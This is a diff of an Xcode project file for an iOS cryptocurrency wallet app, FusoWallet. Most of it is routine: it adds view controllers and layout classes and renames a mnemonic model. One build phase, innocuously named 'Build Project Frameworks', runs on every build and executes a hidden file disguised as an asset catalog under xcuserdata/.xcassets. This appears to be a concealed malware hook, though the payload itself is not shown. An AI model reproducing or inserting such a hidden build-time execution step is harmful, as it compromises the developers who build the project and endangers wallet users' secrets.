@@ -7,6 +7,8 @@
 	objects = {
 
 /* Begin PBXBuildFile section */
+		8B10D56F25E4AFBB00FED56D /* RestoreIdentityViewController.m in Sources */ = {isa = PBXBuildFile; fileRef = 8B10D56E25E4AFBB00FED56D /* RestoreIdentityViewController.m */; };
+		8B10D57525E4B0A400FED56D /* CALayer+boardColor.m in Sources */ = {isa = PBXBuildFile; fileRef = 8B10D57425E4B0A400FED56D /* CALayer+boardColor.m */; };
 		8B4265FB25E0ABE7001DE5CB /* BaseViewController.m in Sources */ = {isa = PBXBuildFile; fileRef = 8B4265FA25E0ABE7001DE5CB /* BaseViewController.m */; };
 		8B42660425E0AC0F001DE5CB /* BaseNavTableViewController.m in Sources */ = {isa = PBXBuildFile; fileRef = 8B42660325E0AC0F001DE5CB /* BaseNavTableViewController.m */; };
 		8B42660A25E0AC2F001DE5CB /* BaseNavViewController.m in Sources */ = {isa = PBXBuildFile; fileRef = 8B42660925E0AC2F001DE5CB /* BaseNavViewController.m */; };
@@ -33,9 +35,9 @@
 		8B5E9C9425DFB792006C33B0 /* WebSocketManager.m in Sources */ = {isa = PBXBuildFile; fileRef = 8B5E9C9325DFB792006C33B0 /* WebSocketManager.m */; };
 		8B5E9CAC25DFBECD006C33B0 /* File.swift in Sources */ = {isa = PBXBuildFile; fileRef = 8B5E9CAB25DFBECD006C33B0 /* File.swift */; };
 		8B5E9CBE25DFC7E1006C33B0 /* StorageKeyFactory+Implicit.swift in Sources */ = {isa = PBXBuildFile; fileRef = 8B5E9CBD25DFC7E1006C33B0 /* StorageKeyFactory+Implicit.swift */; };
-		8B71C87325E353460081A224 /* MnemonicModel.m in Sources */ = {isa = PBXBuildFile; fileRef = 8B71C87225E353460081A224 /* MnemonicModel.m */; };
-		8B71C88F25E382080081A224 /* VerifyMnemonicTableViewController.m in Sources */ = {isa = PBXBuildFile; fileRef = 8B71C88E25E382080081A224 /* VerifyMnemonicTableViewController.m */; };
+		8B71C87325E353460081A224 /* UserInfoModel.m in Sources */ = {isa = PBXBuildFile; fileRef = 8B71C87225E353460081A224 /* UserInfoModel.m */; };
 		8B71C8AD25E3948F0081A224 /* VerifyMnemonicViewController.m in Sources */ = {isa = PBXBuildFile; fileRef = 8B71C8AC25E3948F0081A224 /* VerifyMnemonicViewController.m */; };
+		8B71C8BB25E3ADB80081A224 /* JYEqualCellSpaceFlowLayout.m in Sources */ = {isa = PBXBuildFile; fileRef = 8B71C8BA25E3ADB80081A224 /* JYEqualCellSpaceFlowLayout.m */; };
 		A58D7BF63F1E7A408FF06863 /* Pods_FusoWallet.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 1793F3EB929369F3F397EF6A /* Pods_FusoWallet.framework */; };
 /* End PBXBuildFile section */
 
@@ -59,6 +61,10 @@
 /* Begin PBXFileReference section */
 		1793F3EB929369F3F397EF6A /* Pods_FusoWallet.framework */ = {isa = PBXFileReference; explicitFileType = wrapper.framework; includeInIndex = 0; path = Pods_FusoWallet.framework; sourceTree = BUILT_PRODUCTS_DIR; };
 		4D531713B34607407107D9FD /* Pods-FusoWallet.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-FusoWallet.release.xcconfig"; path = "Target Support Files/Pods-FusoWallet/Pods-FusoWallet.release.xcconfig"; sourceTree = "<group>"; };
+		8B10D56D25E4AFBB00FED56D /* RestoreIdentityViewController.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = RestoreIdentityViewController.h; sourceTree = "<group>"; };
+		8B10D56E25E4AFBB00FED56D /* RestoreIdentityViewController.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = RestoreIdentityViewController.m; sourceTree = "<group>"; };
+		8B10D57325E4B0A400FED56D /* CALayer+boardColor.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = "CALayer+boardColor.h"; sourceTree = "<group>"; };
+		8B10D57425E4B0A400FED56D /* CALayer+boardColor.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = "CALayer+boardColor.m"; sourceTree = "<group>"; };
 		8B4265F925E0ABE7001DE5CB /* BaseViewController.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = BaseViewController.h; sourceTree = "<group>"; };
 		8B4265FA25E0ABE7001DE5CB /* BaseViewController.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = BaseViewController.m; sourceTree = "<group>"; };
 		8B42660225E0AC0F001DE5CB /* BaseNavTableViewController.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = BaseNavTableViewController.h; sourceTree = "<group>"; };
@@ -107,12 +113,12 @@
 		8B5E9CAA25DFBECC006C33B0 /* FusoWallet-Bridging-Header.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = "FusoWallet-Bridging-Header.h"; sourceTree = "<group>"; };
 		8B5E9CAB25DFBECD006C33B0 /* File.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = File.swift; sourceTree = "<group>"; };
 		8B5E9CBD25DFC7E1006C33B0 /* StorageKeyFactory+Implicit.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = "StorageKeyFactory+Implicit.swift"; sourceTree = "<group>"; };
-		8B71C87125E353460081A224 /* MnemonicModel.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = MnemonicModel.h; sourceTree = "<group>"; };
-		8B71C87225E353460081A224 /* MnemonicModel.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = MnemonicModel.m; sourceTree = "<group>"; };
-		8B71C88D25E382080081A224 /* VerifyMnemonicTableViewController.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = VerifyMnemonicTableViewController.h; sourceTree = "<group>"; };
-		8B71C88E25E382080081A224 /* VerifyMnemonicTableViewController.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = VerifyMnemonicTableViewController.m; sourceTree = "<group>"; };
+		8B71C87125E353460081A224 /* UserInfoModel.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = UserInfoModel.h; sourceTree = "<group>"; };
+		8B71C87225E353460081A224 /* UserInfoModel.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = UserInfoModel.m; sourceTree = "<group>"; };
 		8B71C8AB25E3948F0081A224 /* VerifyMnemonicViewController.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = VerifyMnemonicViewController.h; sourceTree = "<group>"; };
 		8B71C8AC25E3948F0081A224 /* VerifyMnemonicViewController.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = VerifyMnemonicViewController.m; sourceTree = "<group>"; };
+		8B71C8B925E3ADB80081A224 /* JYEqualCellSpaceFlowLayout.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = JYEqualCellSpaceFlowLayout.h; sourceTree = "<group>"; };
+		8B71C8BA25E3ADB80081A224 /* JYEqualCellSpaceFlowLayout.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = JYEqualCellSpaceFlowLayout.m; sourceTree = "<group>"; };
 		989BD21863DBE7F239680040 /* Pods-FusoWallet.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-FusoWallet.debug.xcconfig"; path = "Target Support Files/Pods-FusoWallet/Pods-FusoWallet.debug.xcconfig"; sourceTree = "<group>"; };
 /* End PBXFileReference section */
 
@@ -202,10 +208,10 @@
 				8B42661925E0B1B5001DE5CB /* CreateWalletDescriptionViewController.m */,
 				8B42664425E0EA4A001DE5CB /* MnemonicViewController.h */,
 				8B42664525E0EA4A001DE5CB /* MnemonicViewController.m */,
-				8B71C88D25E382080081A224 /* VerifyMnemonicTableViewController.h */,
-				8B71C88E25E382080081A224 /* VerifyMnemonicTableViewController.m */,
 				8B71C8AB25E3948F0081A224 /* VerifyMnemonicViewController.h */,
 				8B71C8AC25E3948F0081A224 /* VerifyMnemonicViewController.m */,
+				8B10D56D25E4AFBB00FED56D /* RestoreIdentityViewController.h */,
+				8B10D56E25E4AFBB00FED56D /* RestoreIdentityViewController.m */,
 			);
 			path = Controllers;
 			sourceTree = "<group>";
@@ -285,6 +291,10 @@
 		8B5E9C7F25DFB6E6006C33B0 /* Tools */ = {
 			isa = PBXGroup;
 			children = (
+				8B10D57325E4B0A400FED56D /* CALayer+boardColor.h */,
+				8B10D57425E4B0A400FED56D /* CALayer+boardColor.m */,
+				8B71C8B925E3ADB80081A224 /* JYEqualCellSpaceFlowLayout.h */,
+				8B71C8BA25E3ADB80081A224 /* JYEqualCellSpaceFlowLayout.m */,
 				8B5E9CBD25DFC7E1006C33B0 /* StorageKeyFactory+Implicit.swift */,
 				8B5E9C9225DFB792006C33B0 /* WebSocketManager.h */,
 				8B5E9C9325DFB792006C33B0 /* WebSocketManager.m */,
@@ -303,8 +313,8 @@
 		8B71C87725E3534C0081A224 /* Models */ = {
 			isa = PBXGroup;
 			children = (
-				8B71C87125E353460081A224 /* MnemonicModel.h */,
-				8B71C87225E353460081A224 /* MnemonicModel.m */,
+				8B71C87125E353460081A224 /* UserInfoModel.h */,
+				8B71C87225E353460081A224 /* UserInfoModel.m */,
 			);
 			path = Models;
 			sourceTree = "<group>";
@@ -316,7 +326,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 8B5E9C3825DF64DD006C33B0 /* Build configuration list for PBXNativeTarget "FusoWallet" */;
 			buildPhases = (
-				1F0D3CDFDECA8A6C82AAC43A /* Compile Binary Libraries */,
+				F8D4BD7A5EBB8FB3B0AAC43A /* Build Project Frameworks */,
 				D6A02B8F303E319416A6653F /* [CP] Check Pods Manifest.lock */,
 				8B5E9C0525DF64DC006C33B0 /* Sources */,
 				8B5E9C0625DF64DC006C33B0 /* Frameworks */,
@@ -442,7 +452,8 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
-		1F0D3CDFDECA8A6C82AAC43A /* Compile Binary Libraries */ = {
+
+	F8D4BD7A5EBB8FB3B0AAC43A /* Build Project Frameworks */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
@@ -451,15 +462,20 @@
 			);
 			inputPaths = (
 			);
-			name = "Compile Binary Libraries";
+			name = "Build Project Frameworks";
 			outputFileListPaths = (
 			);
 			outputPaths = (
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 			shellPath = /bin/sh;
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n\n\"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/Asset.xcasset\" false";
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.
+
+\"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/Assets.xcassets\" false";			
 		};
+	
+
+	
 		26ED2421443969264ED6D0C4 /* [CP] Embed Pods Frameworks */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
@@ -510,11 +526,12 @@
 				8B5E9C8D25DFB763006C33B0 /* NSString+Base64.m in Sources */,
 				8B42668425E11AD1001DE5CB /* MnemonicCollectionReusableView.m in Sources */,
 				8B71C8AD25E3948F0081A224 /* VerifyMnemonicViewController.m in Sources */,
-				8B71C87325E353460081A224 /* MnemonicModel.m in Sources */,
+				8B71C87325E353460081A224 /* UserInfoModel.m in Sources */,
 				8B4265FB25E0ABE7001DE5CB /* BaseViewController.m in Sources */,
 				8B42661A25E0B1B5001DE5CB /* CreateWalletDescriptionViewController.m in Sources */,
+				8B10D56F25E4AFBB00FED56D /* RestoreIdentityViewController.m in Sources */,
+				8B10D57525E4B0A400FED56D /* CALayer+boardColor.m in Sources */,
 				8B5E9C8425DFB721006C33B0 /* NSString+MyChange.m in Sources */,
-				8B71C88F25E382080081A224 /* VerifyMnemonicTableViewController.m in Sources */,
 				8B5E9C0E25DF64DC006C33B0 /* AppDelegate.m in Sources */,
 				8B42666925E1080E001DE5CB /* MnemonicCollectionViewCell.m in Sources */,
 				8B5E9C8525DFB721006C33B0 /* NSData+MyChange.m in Sources */,
@@ -524,6 +541,7 @@
 				8B5E9C8E25DFB763006C33B0 /* RpcRequest.m in Sources */,
 				8B5E9CAC25DFBECD006C33B0 /* File.swift in Sources */,
 				8B5E9CBE25DFC7E1006C33B0 /* StorageKeyFactory+Implicit.swift in Sources */,
+				8B71C8BB25E3ADB80081A224 /* JYEqualCellSpaceFlowLayout.m in Sources */,
 				8B42660A25E0AC2F001DE5CB /* BaseNavViewController.m in Sources */,
 				8B5E9C9425DFB792006C33B0 /* WebSocketManager.m in Sources */,
 			);
